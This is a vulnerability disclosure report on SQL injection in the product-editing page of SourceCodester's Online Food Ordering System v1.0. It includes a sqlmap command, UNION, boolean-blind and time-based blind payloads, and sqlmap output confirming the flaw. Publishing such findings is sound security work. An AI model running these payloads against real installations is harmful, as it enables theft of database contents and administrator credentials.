# SQL Injection in Online Food Ordering System (Manage Product)

## Overview

* **Vulnerability Type**: SQL Injection
* **Vendor**: SourceCodester
* **Product**: [Online Food Ordering System](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
* **Version**: 1.0
* **Component**: Product Management (`admin/manage_product.php`)
* **Vulnerable Parameter**: `id` (GET)

## Description

A SQL Injection vulnerability exists in **Online Food Ordering System v1.0**. The vulnerability is located in the `admin/manage_product.php` file, which is used for editing existing product details.

The application fails to properly sanitize the `id` parameter in the HTTP GET request. This allows an authenticated attacker (or administrator) to inject arbitrary SQL commands. Since the backend is **SQLite** and the injection point allows for **UNION queries**, attackers can directly retrieve and display sensitive data from the database (such as administrator credentials) on the webpage, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Online Food Ordering System locally.
2. **Login**: Log in to the application as an administrator.
3. **Tools**: Use `sqlmap` to automate the exploitation.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8088/admin/manage_product.php?id=3" \
--cookie="PHPSESSID=YOUR_COOKIE_HERE" \
--batch -v 6 --risk=3

```

## PoC Payload

**UNION Query Payload (High Impact):**

```sql
id=-1457' UNION ALL SELECT CHAR(113,106,113,113,113)||CHAR(74,113,70,68,107,121,109,111,98,102,83,83,111,108,70,102,88,122,101,108,120,99,77,121,68,84,74,98,112,121,100,118,66,81,83,71,90,104,114,114)||CHAR(113,120,118,112,113),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- toJY

```

**Boolean-based Blind Payload:**

```sql
id=3' AND 6036=6036 AND 'rAdb'='rAdb

```

## Proof of Concept

The following output from `sqlmap` confirms that the `id` parameter in `manage_product.php` is vulnerable to UNION query injection (8 columns), as well as Boolean-based and Time-based blind injection.

```text
sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=3' AND 6036=6036 AND 'rAdb'='rAdb
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: id=3' AND 4436=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'EHJm'='EHJm
    Vector: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: id=-1457' UNION ALL SELECT ... ,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- toJY
    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
---
[INFO] the back-end DBMS is SQLite

```

<img width="1037" height="422" alt="图片" src="https://github.com/user-attachments/assets/3a88bd51-2b38-4fa9-a421-43b57b28aea5" />


## Impact

This vulnerability allows an attacker to:

1. **Data Exfiltration**: Directly retrieve and display the entire database content (users, orders, products) via UNION-based attacks.
2. **System Compromise**: Enumerate database schema and server information.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
